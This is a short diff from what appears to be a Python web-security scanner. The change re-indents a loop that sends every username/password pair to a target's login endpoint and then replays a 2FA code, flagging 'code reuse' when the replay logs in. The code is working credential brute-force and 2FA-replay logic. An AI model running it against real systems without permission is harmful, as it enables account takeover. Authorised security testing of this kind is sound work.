@@ -59,25 +59,25 @@ else:
 # Loop through the list of usernames
 for username in usernames:
     for password in passwords:
-    # Send a login request to the target URL with the username
-    # Assumes the login page is at a path like "/login"
-    # Assumes the login form has fields for "username" and "password"
-    data = {"username": username, "password": password}
-    response = requests.post(f"{target_url}/login", data=data, proxies={"http": f"http://{proxy_address}:{proxy_port}", "https": f"http://{proxy_address}:{proxy_port}"})
+        # Send a login request to the target URL with the username
+        # Assumes the login page is at a path like "/login"
+        # Assumes the login form has fields for "username" and "password"
+        data = {"username": username, "password": password}
+        response = requests.post(f"{target_url}/login", data=data, proxies={"http": f"http://{proxy_address}:{proxy_port}", "https": f"http://{proxy_address}:{proxy_port}"})
 
-    # Check if the response indicates that 2FA is required
-    if "2FA" in response.text:
+        # Check if the response indicates that 2FA is required
+        if "2FA" in response.text:
 
-        # Send a second login request with the username and token
-        # Assumes the 2FA form has fields for "username" and "token"
-        data = {"username": username, "token": code}
-        response = requests.post(f"{target_url}/2fa", data=data, proxies={"http": f"http://{proxy_address}:{proxy_port}", "https": f"http://{proxy_address}:{proxy_port}"})
+            # Send a second login request with the username and token
+            # Assumes the 2FA form has fields for "username" and "token"
+            data = {"username": username, "token": code}
+            response = requests.post(f"{target_url}/2fa", data=data, proxies={"http": f"http://{proxy_address}:{proxy_port}", "https": f"http://{proxy_address}:{proxy_port}"})
 
-        # Check if the response indicates that the login was successful
-        if "logged in" in response.text:
-            output += f"Code reuse vulnerability detected for username '{username}'\n"
-        else:
-            output += f"No code reuse vulnerability detected for username '{username}'\n"
+            # Check if the response indicates that the login was successful
+            if "logged in" in response.text:
+                output += f"Code reuse vulnerability detected for username '{username}'\n"
+            else:
+                output += f"No code reuse vulnerability detected for username '{username}'\n"
 
 #                                                       Vulnerable 2FA implementation
 
